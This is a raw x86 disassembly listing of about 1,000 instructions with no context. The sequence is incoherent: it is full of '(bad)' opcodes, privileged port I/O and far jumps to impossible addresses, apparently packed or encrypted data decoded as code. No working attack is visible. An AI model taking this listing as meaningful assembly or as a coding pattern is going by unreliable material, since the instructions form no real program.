  4405e4:	stos   BYTE PTR es:[edi],al
  4405e5:	mov    DWORD PTR [ecx-0x71],esp
  4405e8:	xchg   esp,eax
  4405e9:	xchg   esi,eax
  4405ea:	das    
  4405eb:	and    BYTE PTR [esi],bh
  4405ed:	sbb    ch,BYTE PTR [esi]
  4405ef:	dec    esi
  4405f0:	aad    0x87
  4405f2:	cmp    al,0x6b
  4405f4:	pusha  
  4405f5:	mov    ds:0x5fb86d49,eax
  4405fa:	ins    DWORD PTR es:[edi],dx
  4405fb:	add    al,0x82
  4405fd:	ror    DWORD PTR [esi],0xdb
  440600:	test   BYTE PTR [ebp+0x5b],ch
  440603:	in     al,dx
  440604:	cmp    DWORD PTR [ebx+0x210ca129],edi
  44060a:	push   esi
  44060b:	outs   dx,DWORD PTR ds:[esi]
  44060c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44060d:	push   ecx
  44060e:	mov    al,ds:0x287d5e0c
  440613:	mov    ds,esp
  440615:	pushf  
  440616:	xor    eax,0x21614447
  44061b:	jbe    0x440681
  44061d:	cmp    al,0x4
  44061f:	(bad)  
  440620:	fnstcw WORD PTR [ebx-0x10]
  440623:	test   DWORD PTR [esp+ebp*4-0x50],edi
  440627:	mov    eax,ds:0xac7abee2
  44062c:	xchg   edx,eax
  44062d:	scas   al,BYTE PTR es:[edi]
  44062e:	and    DWORD PTR [edi+0x7e307fb8],ebx
  440634:	ficom  WORD PTR [edi]
  440636:	push   0xee07e3f9
  44063b:	xlat   BYTE PTR ds:[ebx]
  44063c:	mov    edi,0xb2b1135a
  440641:	mov    dh,0x8e
  440643:	or     edx,ebx
  440645:	pop    ecx
  440646:	dec    ebp
  440647:	push   ds
  440648:	repnz push ss
  44064a:	and    DWORD PTR es:[esi],esp
  44064d:	call   FWORD PTR [ebx+0x2b]
  440650:	pop    esi
  440651:	cmp    al,BYTE PTR [ecx+0x21]
  440654:	cdq    
  440655:	lea    ebp,[edx+eiz*2+0x59]
  440659:	inc    ebp
  44065a:	cli    
  44065b:	daa    
  44065c:	and    edx,ebx
  44065e:	inc    ebx
  44065f:	inc    esi
  440660:	push   es
  440661:	xor    ebp,DWORD PTR [ebp+0x458353c6]
  440667:	imul   esp,DWORD PTR [ebp-0x1cb311f0],0x2676c9fe
  440671:	sahf   
  440672:	cmp    eax,0xfc6103eb
  440677:	jmp    0x440604
  440679:	das    
  44067a:	mov    ch,0x0
  44067c:	adc    edi,DWORD PTR [eax-0x12]
  44067f:	outs   dx,DWORD PTR ds:[esi]
  440680:	outs   dx,BYTE PTR ds:[esi]
  440681:	pop    ds
  440682:	out    dx,eax
  440683:	test   eax,0xa18874b0
  440688:	xchg   ebx,eax
  440689:	inc    esi
  44068a:	(bad)  
  44068b:	fild   QWORD PTR [ecx-0xe]
  44068e:	push   0xb5b85e74
  440693:	cdq    
  440694:	dec    esp
  440695:	call   0x60c04ed8
  44069a:	bnd call 0xf1f64a99
  4406a0:	rcl    DWORD PTR [ebx],cl
  4406a2:	out    dx,al
  4406a3:	push   edx
  4406a4:	adc    al,0x1
  4406a6:	cs inc esi
  4406a8:	add    al,0xb6
  4406aa:	and    al,0x83
  4406ac:	cwde   
  4406ad:	inc    ebx
  4406ae:	loopne 0x440705
  4406b0:	ins    BYTE PTR es:[edi],dx
  4406b1:	pusha  
  4406b2:	stos   DWORD PTR es:[edi],eax
  4406b3:	inc    edx
  4406b4:	mov    cl,0x59
  4406b6:	iret   
  4406b7:	mov    ecx,0x8be4205e
  4406bc:	cmovb  eax,edi
  4406bf:	push   edi
  4406c0:	pop    eax
  4406c1:	popa   
  4406c2:	pop    ss
  4406c3:	xor    BYTE PTR fs:[eax+ebx*4-0x11c1b57f],dl
  4406cb:	pushf  
  4406cc:	enter  0xd3c9,0x69
  4406d0:	scas   al,BYTE PTR es:[edi]
  4406d1:	dec    ebx
  4406d2:	and    eax,0x71b3fba1
  4406d7:	ret    
  4406d8:	in     eax,0x97
  4406da:	in     al,dx
  4406db:	aas    
  4406dc:	pop    edx
  4406dd:	lods   eax,DWORD PTR ds:[esi]
  4406de:	cmc    
  4406df:	xchg   esp,eax
  4406e0:	push   eax
  4406e1:	jle    0x440711
  4406e3:	add    BYTE PTR [ebx-0x66],ah
  4406e6:	mov    ebx,0x71f7cba3
  4406eb:	mov    BYTE PTR [edx-0x4a9e85d6],ch
  4406f1:	mov    esp,0x725e16a6
  4406f6:	push   esi
  4406f7:	push   ecx
  4406f8:	(bad)  
  4406f9:	out    dx,eax
  4406fa:	push   ebp
  4406fb:	xchg   edx,eax
  4406fc:	mov    edx,0x9947f360
  440701:	stos   BYTE PTR es:[edi],al
  440702:	add    al,0x90
  440704:	jno    0x440759
  440706:	sti    
  440707:	mov    DWORD PTR [edx-0x2e],edi
  44070a:	in     eax,dx
  44070b:	push   esi
  44070c:	enter  0x5557,0x3e
  440710:	jp     0x440720
  440712:	mov    eax,ds:0x591f0ca1
  440717:	js     0x44077f
  440719:	out    dx,al
  44071a:	mov    gs,WORD PTR [esi+edi*2]
  44071d:	jl     0x44070a
  44071f:	add    eax,0x8b6d819b
  440724:	jmp    0x374c8301
  440729:	and    ebx,DWORD PTR [edi]
  44072b:	(bad)  
  44072c:	pop    ebx
  44072d:	ret    0xa1f7
  440730:	mov    ds:0x57e4ab21,al
  440735:	sub    DWORD PTR [esi],0xff436320
  44073b:	loope  0x4406e9
  44073d:	(bad)  
  44073e:	out    dx,al
  44073f:	ins    BYTE PTR es:[edi],dx
  440740:	test   BYTE PTR [ebx],bl
  440742:	scas   al,BYTE PTR es:[edi]
  440743:	jb     0x4406f5
  440745:	push   edx
  440746:	push   0xffffffdc
  440748:	mov    BYTE PTR [ebx+ebp*2-0x59319662],cl
  44074f:	fistp  DWORD PTR [ecx-0x7b]
  440752:	out    dx,al
  440753:	and    ecx,esi
  440755:	adc    DWORD PTR [eax-0x7b0c3de3],edx
  44075b:	fldcw  WORD PTR [ebp+0x2c9deef3]
  440761:	je     0x440793
  440763:	xor    al,0xdc
  440765:	lahf   
  440766:	out    dx,al
  440767:	into   
  440768:	jae    0x440716
  44076a:	retf   0xbabb
  44076d:	(bad)  
  44076e:	cli    
  44076f:	mov    ds:0xb8b40d99,al
  440774:	mov    al,ds:0xea206788
  440779:	add    BYTE PTR [ecx-0x9],0xe
  44077d:	and    ebp,esi
  44077f:	mov    DWORD PTR [ebx-0x4dfe4f7],0xb478ff30
  440789:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44078a:	dec    esi
  44078b:	mov    eax,ds:0x66e35c7c
  440790:	xchg   ebx,eax
  440791:	cmp    al,0xa6
  440793:	(bad)  
  440794:	pop    esi
  440795:	adc    bh,BYTE PTR [edx+0x7b382570]
  44079b:	mov    ebp,0x7b4a6496
  4407a0:	ficom  WORD PTR [ebx-0x57]
  4407a3:	scas   eax,DWORD PTR es:[edi]
  4407a4:	cdq    
  4407a5:	mov    bh,0xf7
  4407a7:	cwde   
  4407a8:	(bad)  
  4407a9:	loop   0x440799
  4407ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4407ac:	cmp    DWORD PTR [esi],edx
  4407ae:	mov    ecx,0xff3ffe2e
  4407b3:	mov    al,ds:0xc404ea98
  4407b8:	popf   
  4407b9:	cmp    DWORD PTR [edi-0x62dfa1b4],0x7082b2dd
  4407c3:	aas    
  4407c4:	popa   
  4407c5:	pop    edi
  4407c6:	jae    0x44078f
  4407c8:	mov    ah,0xe0
  4407ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4407cb:	in     eax,dx
  4407cc:	inc    BYTE PTR [edi-0x65a13f35]
  4407d2:	mov    dl,0x16
  4407d4:	mov    DWORD PTR [ebp-0x7d],0x775323f6
  4407db:	xor    eax,0x20eeb37d
  4407e0:	pop    esp
  4407e1:	lahf   
  4407e2:	or     bl,bh
  4407e4:	pop    esi
  4407e5:	call   0x4d880839
  4407ea:	jg     0x44080e
  4407ec:	or     al,0x5f
  4407ee:	mov    dl,BYTE PTR [esi+0x1162dde2]
  4407f4:	adc    cl,BYTE PTR [esi+0x1aa7c5ee]
  4407fa:	pushf  
  4407fb:	mov    cl,0xf6
  4407fd:	pusha  
  4407fe:	mov    ebp,0xd72fafb3
  440803:	mov    ebp,es
  440805:	push   cs
  440806:	cmc    
  440807:	retf   
  440808:	add    al,BYTE PTR [edx-0x2735e72]
  44080e:	jns    0x440815
  440810:	test   al,0x60
  440812:	aad    0x41
  440814:	add    bl,ch
  440816:	push   esi
  440817:	addr16 pop esp
  440819:	mov    dh,0x4a
  44081b:	icebp  
  44081c:	pop    ebp
  44081d:	(bad)  
  44081e:	js     0x440879
  440820:	fld    DWORD PTR [ecx-0x7e]
  440823:	jmp    0x16866691
  440828:	fimul  DWORD PTR [eax]
  44082a:	int    0xba
  44082c:	pusha  
  44082d:	adc    al,0xbd
  44082f:	iret   
  440830:	xor    cl,BYTE PTR [eax+0x2e]
  440833:	jno    0x440805
  440835:	jne    0x440820
  440837:	das    
  440838:	inc    edx
  440839:	loope  0x4407e3
  44083b:	cmp    bl,BYTE PTR [esi-0x43]
  44083e:	xchg   esi,eax
  44083f:	dec    esp
  440840:	in     al,dx
  440841:	addr16 inc esi
  440843:	mov    al,ds:0xa795e4f7
  440848:	(bad)  
  440849:	adc    edi,ebx
  44084b:	xor    BYTE PTR [edi+ebx*4],dh
  44084e:	out    dx,al
  44084f:	jecxz  0x440818
  440851:	gs aas 
  440853:	lods   eax,DWORD PTR ds:[esi]
  440854:	mov    eax,0x9aae97e8
  440859:	mov    dh,0xee
  44085b:	(bad)  
  44085c:	mov    bl,0xd7
  44085e:	jl     0x440831
  440860:	addr16 (bad) 
  440862:	jmp    0x880c:0x462fc4d8
  440869:	fild   QWORD PTR [ecx]
  44086b:	sbb    ecx,DWORD PTR [eax]
  44086d:	popf   
  44086e:	sub    al,BYTE PTR [eax+0x5e]
  440871:	jle    0x440879
  440873:	shl    DWORD PTR [esi-0x7ed5af73],cl
  440879:	pusha  
  44087a:	scas   al,BYTE PTR es:[edi]
  44087b:	push   ecx
  44087c:	xor    BYTE PTR [ebp-0x5d945b76],dh
  440882:	out    dx,al
  440883:	mov    ecx,esi
  440885:	lods   al,BYTE PTR ds:[esi]
  440886:	(bad)  
  440887:	(bad)  
  440889:	dec    eax
  44088a:	test   al,0x6a
  44088c:	jmp    DWORD PTR [eax-0x5b]
  44088f:	pushf  
  440890:	popf   
  440891:	jae    0x440835
  440893:	lea    ecx,[edi+0x648f505a]
  440899:	jnp    0x440884
  44089b:	cmp    BYTE PTR [edx+0x40],0xe0
  44089f:	in     eax,dx
  4408a0:	sti    
  4408a1:	arpl   WORD PTR [ebx+0x596b86a1],bp
  4408a7:	aaa    
  4408a8:	shl    DWORD PTR [eax+0xc6f4caa],1
  4408ae:	out    dx,al
  4408af:	pop    esp
  4408b0:	lock icebp 
  4408b2:	mov    ebp,DWORD PTR [ebp-0x67]
  4408b5:	sub    dl,BYTE PTR [edi-0x5f]
  4408b8:	stos   BYTE PTR es:[edi],al
  4408b9:	xchg   ebx,eax
  4408ba:	and    DWORD PTR [esi+0x49],edi
  4408bd:	sbb    edx,DWORD PTR [edx]
  4408bf:	out    dx,eax
  4408c0:	pop    edi
  4408c1:	je     0x440892
  4408c3:	test   al,0xa8
  4408c5:	fisttp DWORD PTR [esi]
  4408c7:	jno    0x44088d
  4408c9:	mov    bh,0x2d
  4408cb:	test   eax,0xe46e8e0f
  4408d0:	lds    esi,FWORD PTR [esi-0x14]
  4408d3:	jmp    0x4408d9
  4408d5:	popf   
  4408d6:	and    DWORD PTR [ebp+0x7531e121],eax
  4408dc:	adc    DWORD PTR [edx+0x5e06dab0],ebp
  4408e2:	cmc    
  4408e3:	and    ch,BYTE PTR [edx]
  4408e5:	add    BYTE PTR [ebp-0x736044da],ah
  4408eb:	adc    al,0xaa
  4408ed:	and    BYTE PTR [ebx-0x71],cl
  4408f0:	dec    ebp
  4408f1:	push   cs
  4408f2:	push   esp
  4408f3:	cld    
  4408f4:	in     eax,dx
  4408f5:	es sti 
  4408f7:	dec    edi
  4408f8:	and    al,0x7d
  4408fa:	out    dx,al
  4408fb:	sbb    ecx,0x14
  4408fe:	and    ebp,DWORD PTR [edi]
  440900:	add    DWORD PTR [ecx-0x80],esp
  440903:	jbe    0x4408e7
  440905:	push   cs
  440906:	call   0xed692256
  44090b:	push   0xc4fa3a08
  440910:	fbstp  TBYTE PTR [ebp+0x60422c66]
  440916:	dec    ebp
  440917:	loop   0x4408d8
  440919:	leave  
  44091a:	lods   al,BYTE PTR ds:[esi]
  44091b:	pop    ecx
  44091c:	sar    DWORD PTR [eax+edx*1+0x5e655ee6],cl
  440923:	retf   
  440924:	xchg   ebp,eax
  440925:	add    BYTE PTR [ebx+0x15644194],bh
  44092b:	jp     0x44098b
  44092d:	adc    al,BYTE PTR [ecx-0x726a5258]
  440933:	xlat   BYTE PTR ds:[ebx]
  440934:	pop    esi
  440935:	pop    edi
  440936:	call   0xa0161d6b
  44093b:	add    dh,0x60
  44093e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44093f:	add    ch,BYTE PTR ds:0x689a9db0
  440945:	dec    esp
  440946:	out    dx,al
  440947:	gs clc 
  440949:	scas   al,BYTE PTR es:[edi]
  44094a:	ja     0x44094f
  44094c:	ja     0x440910
  44094e:	mov    ch,0xa0
  440950:	jbe    0x4409be
  440952:	shr    DWORD PTR [ebp-0x28],cl
  440955:	push   cs
  440956:	push   ebx
  440957:	in     al,dx
  440958:	pop    esi
  440959:	cs pusha 
  44095b:	xchg   edi,eax
  44095c:	xchg   ebp,eax
  44095d:	sub    ch,BYTE PTR ds:0x31609e23
  440963:	and    DWORD PTR [eax-0x1180b415],ebx
  440969:	jecxz  0x440959
  44096b:	lods   al,BYTE PTR ds:[esi]
  44096c:	das    
  44096d:	fnstsw WORD PTR [esi+edx*4+0x1b]
  440971:	fidivr WORD PTR [ecx-0x22253860]
  440977:	out    dx,al
  440978:	les    esp,FWORD PTR [ecx+0x7c5e9c91]
  44097e:	clc    
  44097f:	inc    edx
  440980:	push   es
  440981:	retfw  0x20fb
  440985:	pop    esi
  440986:	(bad)  
  440987:	push   ds
  440988:	or     dl,BYTE PTR ds:0x2386193f
  44098e:	dec    edx
  44098f:	lds    ebx,FWORD PTR [esi+0xf]
  440992:	int3   
  440993:	inc    eax
  440994:	xchg   edx,eax
  440995:	pop    edx
  440996:	ret    0xcae0
  440999:	pusha  
  44099a:	arpl   WORD PTR [edi+0x18],ax
  44099d:	sub    al,BYTE PTR [ecx-0x61]
  4409a0:	outs   dx,BYTE PTR ds:[esi]
  4409a1:	xor    esp,DWORD PTR [esi+0x8]
  4409a4:	pop    esi
  4409a5:	pop    ss
  4409a6:	jnp    0x44096b
  4409a8:	pop    edx
  4409a9:	cdq    
  4409aa:	and    eax,0x5561618c
  4409af:	jns    0x4409b4
  4409b1:	shl    DWORD PTR [eax-0x11b2be01],cl
  4409b7:	sbb    bh,al
  4409b9:	out    0x7c,eax
  4409bb:	push   es
  4409bc:	jmp    0x440978
  4409be:	daa    
  4409bf:	mov    eax,ds:0xaf6e00b3
  4409c4:	aaa    
  4409c5:	push   0x825eda6b
  4409ca:	jg     0x4409bf
  4409cc:	cmp    al,0x3b
  4409ce:	mov    ds:0x48660157,eax
  4409d3:	imul   ebx,edi,0x11
  4409d6:	pop    ebp
  4409d7:	add    eax,edx
  4409d9:	push   DWORD PTR [esi]
  4409db:	aaa    
  4409dc:	pop    esp
  4409dd:	fsubr  st,st(6)
  4409df:	jne    0x44099d
  4409e1:	fstp   TBYTE PTR [ebx]
  4409e3:	xor    DWORD PTR [ecx+0x2c],esi
  4409e6:	adc    BYTE PTR [edx+0x7bee42f8],ch
  4409ec:	loope  0x440a38
  4409ee:	mov    ebx,0x1f2229ad
  4409f3:	mov    ds:0x94ace0c2,al
  4409f8:	outs   dx,BYTE PTR ds:[esi]
  4409f9:	sbb    edi,DWORD PTR [ebp-0x3d]
  4409fc:	rcl    BYTE PTR [edx-0x65],1
  4409ff:	ret    0xf1ad
  440a02:	out    dx,al
  440a03:	mov    WORD PTR ds:0x5e968dba,ds
  440a09:	adc    BYTE PTR [esi],0xdf
  440a0c:	push   ecx
  440a0d:	ja     0x4409e0
  440a0f:	cwde   
  440a10:	addr16 popa 
  440a12:	fs test al,0x88
  440a15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440a16:	into   
  440a17:	jae    0x4409a3
  440a19:	(bad)  
  440a1a:	out    dx,al
  440a1b:	(bad)  
  440a1c:	lds    esp,FWORD PTR ss:[ebx]
  440a1f:	lock adc al,0xb
  440a22:	stos   DWORD PTR es:[edi],eax
  440a23:	mov    al,ds:0x5fb158f6
  440a28:	(bad)  
  440a29:	sbb    BYTE PTR [bp+si+0x5e],dh
  440a2d:	das    
  440a2e:	std    
  440a2f:	xor    al,0x7f
  440a31:	popa   
  440a32:	js     0x440a58
  440a34:	xor    al,0x26
  440a36:	xor    esp,DWORD PTR [ecx+0x3ce5b819]
  440a3c:	pop    edi
  440a3d:	aas    
  440a3e:	dec    eax
  440a3f:	mov    ebx,DWORD PTR [esi+0x51]
  440a42:	loop   0x440a13
  440a44:	stos   DWORD PTR es:[edi],eax
  440a45:	(bad)  
  440a47:	mov    ch,0x1f
  440a49:	popa   
  440a4a:	call   0x4cbb:0xde31b2c8
  440a51:	mov    al,0xee
  440a53:	or     al,0xdc
  440a55:	jno    0x440a79
  440a57:	ret    
  440a58:	jno    0x4409e9
  440a5a:	in     eax,dx
  440a5b:	(bad)  
  440a5c:	pop    ds
  440a5d:	shr    BYTE PTR [eax+eiz*8+0x6],0x10
  440a62:	cs pop ebp
  440a64:	mov    esp,DWORD PTR [ebx+0x12]
  440a67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  440a68:	ss call 0xf6b2ac0c
  440a6e:	xor    DWORD PTR [edx+0xa],eax
  440a71:	xchg   DWORD PTR ds:0xaacd7f9f,ecx
  440a77:	or     ebx,DWORD PTR [esi-0x7e6e3091]
  440a7d:	adc    ch,dh
  440a7f:	pop    ds
  440a80:	dec    edx
  440a81:	jae    0x440a89
  440a83:	aaa    
  440a84:	add    ch,BYTE PTR [ecx+0x13]
  440a87:	mov    eax,ds:0xa35c9c22
  440a8c:	fld    TBYTE PTR [esi]
  440a8e:	xchg   ecx,esp
  440a90:	pop    esi
  440a91:	mov    WORD PTR [ebp-0x6],ss
  440a94:	leave  
  440a95:	or     eax,0xc86d1435
  440a9a:	pop    es
  440a9b:	mov    eax,ds:0x4e466064
  440aa0:	es retf 
  440aa2:	call   0x5a996916
  440aa7:	pop    eax
  440aa8:	inc    esi
  440aa9:	in     eax,dx
  440aaa:	loop   0x440abe
  440aac:	je     0x440af2
  440aae:	pop    ebp
  440aaf:	adc    ah,BYTE PTR [esi-0x5f]
  440ab2:	push   ecx
  440ab3:	stc    
  440ab4:	sbb    bl,dl
  440ab6:	xor    dh,ah
  440ab8:	pop    esi
  440ab9:	loop   0x440ac7
  440abb:	lock les ebx,FWORD PTR [edx]
  440abe:	jp     0x440b24
  440ac0:	or     esp,DWORD PTR [edx+0x39]
  440ac3:	imul   ebx,DWORD PTR [esi+0x19],0x2b9cb43a
  440aca:	push   esp
  440acb:	out    dx,al
  440acc:	pop    ebx
  440acd:	lock mov ch,ch
  440ad0:	mov    eax,ds:0xfa93aeb0
  440ad5:	hlt    
  440ad6:	call   0xaf4c:0x7d641a1
  440add:	or     al,0x5d
  440adf:	fwait
  440ae0:	pop    esi
  440ae1:	fimul  WORD PTR [ecx-0x77]
  440ae4:	in     al,0xe4
  440ae6:	cwde   
  440ae7:	mov    al,0xfe
  440ae9:	inc    ebx
  440aea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440aeb:	sub    dl,ah
  440aed:	adc    BYTE PTR fs:[bp+di+0x28],al
  440af2:	sub    al,0x71
  440af4:	push   0x4cbb1cf5
  440af9:	pop    esp
  440afa:	lock xchg DWORD PTR [esi+0x44],ebx
  440afe:	inc    esi
  440aff:	cmp    BYTE PTR [ecx-0x1b790907],0x5d
  440b06:	sbb    eax,0x834ab0d5
  440b0b:	test   al,0xce
  440b0d:	mov    ebx,0x75ae3ecb
  440b12:	out    dx,al
  440b13:	cmc    
  440b14:	test   bh,0xa5
  440b17:	pusha  
  440b18:	and    al,0xe6
  440b1a:	jle    0x440abe
  440b1c:	add    DWORD PTR [ebx-0x1a2ca7],ecx
  440b22:	sub    BYTE PTR [ebp-0x58],dl
  440b25:	int3   
  440b26:	out    dx,al
  440b27:	pop    ds
  440b28:	outs   dx,BYTE PTR ds:[esi]
  440b29:	jp     0x440ab0
  440b2b:	mov    al,0xb6
  440b2d:	jge    0x440ba8
  440b2f:	mov    eax,ds:0xcda171af
  440b34:	ds push ds
  440b36:	fsubp  st(3),st
  440b38:	arpl   WORD PTR [edx-0x7f0f73b3],sp
  440b3e:	mov    bh,0x60
  440b40:	or     dh,bh
  440b42:	push   es
  440b43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  440b44:	and    ebx,DWORD PTR [eax+0x666cabac]
  440b4a:	xchg   esi,eax
  440b4b:	dec    edx
  440b4c:	scas   al,BYTE PTR es:[edi]
  440b4d:	fisub  WORD PTR [esi]
  440b4f:	jbe    0x440aee
  440b51:	es cs pop bx
  440b55:	sbb    eax,0x5eca462b
  440b5a:	inc    bh
  440b5c:	xchg   esi,eax
  440b5d:	arpl   WORD PTR [eax],bx
  440b5f:	stos   BYTE PTR es:[edi],al
  440b60:	cmp    al,0x3d
  440b62:	outs   dx,BYTE PTR ds:[esi]
  440b63:	jmp    0x440b22
  440b65:	jbe    0x440aeb
  440b67:	cmp    eax,0x1eeecc79
  440b6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440b6d:	ja     0x440bb7
  440b6f:	pop    ss
  440b70:	sub    eax,ebp
  440b72:	sub    DWORD PTR [ecx+0x4868cf17],esp
  440b78:	jae    0x440be8
  440b7a:	sbb    esi,eax
  440b7c:	arpl   WORD PTR [eax],cx
  440b7e:	inc    esi
  440b7f:	push   ebx
  440b80:	in     eax,dx
  440b81:	sub    ch,dh
  440b83:	push   ss
  440b84:	cdq    
  440b85:	call   0xa155:0xaae25f73
  440b8c:	(bad)  
  440b8d:	ins    BYTE PTR es:[edi],dx
  440b8e:	pop    ds
  440b8f:	xlat   BYTE PTR ds:[ebx]
  440b90:	push   ebx
  440b91:	mov    ah,0xa3
  440b93:	xor    DWORD PTR [esi-0x1d],ebx
  440b96:	enter  0x7329,0x7d
  440b9a:	jl     0x440b75
  440b9c:	add    dl,BYTE PTR [edx-0x43]
  440b9f:	(bad)
  440ba2:	lock pushf 
  440ba4:	inc    edi
  440ba5:	mov    dl,0xe1
  440ba7:	mov    al,ds:0xfac40385
  440bac:	repz inc ebx
  440bae:	add    dl,BYTE PTR [ecx-0x6daedfee]
  440bb4:	out    dx,al
  440bb5:	sbb    al,0xa8
  440bb7:	test   BYTE PTR [edx+0x23],cl
  440bba:	mov    esi,0xeee0d4f6
  440bbf:	ffree  st(6)
  440bc1:	lea    esi,[eax*1-0x5e59907b]
  440bc8:	into   
  440bc9:	out    dx,al
  440bca:	xchg   edx,eax
  440bcb:	and    eax,0xd46970b1
  440bd0:	pop    esi
  440bd1:	or     BYTE PTR [ebp+0x75],bl
  440bd4:	daa    
  440bd5:	dec    esp
  440bd6:	int3   
  440bd7:	pop    eax
  440bd8:	fist   DWORD PTR [edx-0x20]
  440bdb:	xchg   ecx,eax
  440bdc:	icebp  
  440bdd:	dec    eax
  440bde:	scas   al,BYTE PTR es:[edi]
  440bdf:	loop   0x440bb0
  440be1:	dec    ecx
  440be2:	pop    ss
  440be3:	ds pop esi
  440be5:	jle    0x440b96
  440be7:	or     al,0x81
  440be9:	stos   DWORD PTR es:[edi],eax
  440bea:	rcr    DWORD PTR [ecx+eiz*1+0x61],cl
  440bee:	pop    edx
  440bef:	dec    ebx
  440bf0:	and    al,0x4
  440bf2:	push   ds
  440bf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  440bf4:	call   0x23c:0x39bceecf
  440bfb:	adc    BYTE PTR [ebp+ebx*1-0x62de371f],dl
  440c02:	out    dx,al
  440c03:	cli    
  440c04:	and    al,0xb9
  440c06:	test   dl,ch
  440c08:	out    dx,eax
  440c09:	iret   
  440c0a:	out    dx,al
  440c0b:	sahf   
  440c0c:	add    al,0x46
  440c0e:	outs   dx,BYTE PTR ds:[si]
  440c10:	int3   
  440c11:	pop    esi
  440c12:	pop    ebx
  440c13:	mov    eax,ds:0x43fb5883
  440c18:	xor    BYTE PTR [ebp+ebx*8+0x3c],0xec
  440c1d:	and    ah,0xd6
  440c20:	arpl   WORD PTR [edi-0x3f60dbc7],bx
  440c26:	retf   0xc9b8
  440c29:	add    DWORD PTR [edi-0x5c],ecx
  440c2c:	aam    0xb7
  440c2e:	les    eax,FWORD PTR [esi-0x74591a79]
  440c34:	rcl    BYTE PTR [edi-0x12],0x81
  440c38:	repnz popa 
  440c3a:	daa    
  440c3b:	adc    al,0x84
  440c3d:	push   ds
  440c3e:	fisub  WORD PTR [eax-0x2e3f9fb3]
  440c44:	retf   0x161a
  440c47:	pop    ss
  440c48:	dec    ebx
  440c49:	dec    ebp
  440c4a:	pop    ebp
  440c4b:	xchg   esi,eax
  440c4c:	pop    esi
  440c4d:	xchg   bh,bl
  440c4f:	dec    esi
  440c50:	and    eax,0x18a171a0
  440c55:	ficomp DWORD PTR [ecx-0x13]
  440c58:	dec    esp
  440c59:	mov    esp,0xdd1346db
  440c5e:	data16 loopne 0x440cbf
  440c61:	sub    bh,BYTE PTR [ecx]
  440c63:	jnp    0x440c0c
  440c65:	das    
  440c66:	rcl    DWORD PTR [ebx+0x5e],0x9
  440c6a:	or     DWORD PTR [ebp-0x2a],edi
  440c6d:	daa    
  440c6e:	cmp    cl,al
  440c70:	into   
  440c71:	pop    ebp
  440c72:	push   0xbeb77bca
  440c77:	push   eax
  440c78:	jbe    0x440c17
  440c7a:	cmp    ch,bh
  440c7c:	push   esp
  440c7d:	xlat   BYTE PTR ds:[ebx]
  440c7e:	iret   
  440c7f:	mov    edx,0x470a519e
  440c84:	test   al,0xed
  440c86:	in     al,0xa7
  440c88:	push   edi
  440c89:	imul   edx,esi,0xfffffffd
  440c8c:	xor    eax,0x62c282a1
  440c91:	nop
  440c92:	out    dx,al
  440c93:	dec    eax
  440c94:	fisttp WORD PTR [eax*1-0x2aa31893]
  440c9b:	mov    al,ds:0xc1fe934
  440ca0:	add    ch,ah
  440ca2:	cwde   
  440ca3:	fstp   DWORD PTR [ebp+0x1f]
  440ca6:	gs (bad) 
  440ca8:	jbe    0x440ce9
  440caa:	pop    es
  440cab:	adc    bl,BYTE PTR [esi-0x725eff11]
  440cb1:	ss inc ecx
  440cb3:	adc    al,ah
  440cb5:	or     edi,edx
  440cb7:	daa    
  440cb8:	pop    esi
  440cb9:	icebp  
  440cba:	sub    eax,0x2597e31b
  440cbf:	or     esi,eax
  440cc1:	pop    ebp
  440cc2:	jno    0x440c47
  440cc4:	dec    ebp
  440cc5:	loope  0x440ca9
  440cc7:	jl     0x440c87
  440cc9:	js     0x440cac
  440ccb:	xchg   edi,eax
  440ccc:	xor    BYTE PTR fs:[ebp-0x777f2e19],0xe5
  440cd4:	call   0xb9f7:0xa6a16438
  440cdb:	dec    esp
  440cdc:	in     al,dx
  440cdd:	loope  0x440c6a
  440cdf:	cmp    al,0x5e
  440ce1:	xchg   al,cl
  440ce3:	jo     0x440c7a
  440ce5:	dec    eax
  440ce6:	in     al,0x54
  440ce8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440ce9:	pop    edi
  440cea:	int    0xcb
  440cec:	out    0x80,eax
  440cee:	mov    ah,0xf4
  440cf0:	stos   BYTE PTR es:[edi],al
  440cf1:	or     BYTE PTR [ebx+0x6c],0x5e
  440cf5:	iret   
  440cf6:	inc    ebp
  440cf7:	outs   dx,DWORD PTR ds:[esi]
  440cf8:	fcomp  st(4)
  440cfa:	or     BYTE PTR [ecx+0x48],dl
  440cfd:	pop    edx
  440cfe:	shr    dl,cl
  440d00:	and    eax,0x35a11504
  440d05:	nop
  440d06:	and    bh,BYTE PTR [esi]
  440d08:	pusha  
  440d09:	scas   eax,DWORD PTR es:[edi]
  440d0a:	je     0x440cb1
  440d0c:	mov    BYTE PTR [ebx-0x788b9e96],bh
  440d12:	or     esp,DWORD PTR [ecx+0x5abb0948]
  440d18:	inc    esp
  440d19:	adc    dh,BYTE PTR [ebx+edi*2-0x3d00a1a2]
  440d20:	xor    eax,0xd8a368af
  440d25:	push   edi
  440d26:	ins    BYTE PTR es:[edi],dx
  440d27:	fcom   QWORD PTR [esi+0x5a]
  440d2a:	outs   dx,BYTE PTR ds:[esi]
  440d2b:	das    
  440d2c:	call   0x5f14e35c
  440d31:	pop    esp
  440d32:	popa   
  440d33:	int    0xfb
  440d35:	inc    edi
  440d36:	cs pop ecx
  440d38:	dec    ecx
  440d39:	popa   
  440d3a:	shl    BYTE PTR [eax+ecx*1],0x2b
  440d3e:	adc    esi,edx
  440d40:	loope  0x440d64
  440d42:	out    dx,al
  440d43:	pop    ss
  440d44:	mov    esp,0xa29cff34
  440d49:	(bad)  
  440d4a:	aas    
  440d4b:	mov    eax,ds:0xc4748a6f
  440d50:	std    
  440d51:	repnz mov al,ds:0xeefff45b
  440d57:	in     al,dx
  440d58:	xchg   ecx,eax
  440d59:	fsub   DWORD PTR [edi+0x336f3831]
  440d5f:	mov    eax,ds:0x86a375d3
  440d64:	(bad)  
  440d65:	push   cs
  440d66:	push   es
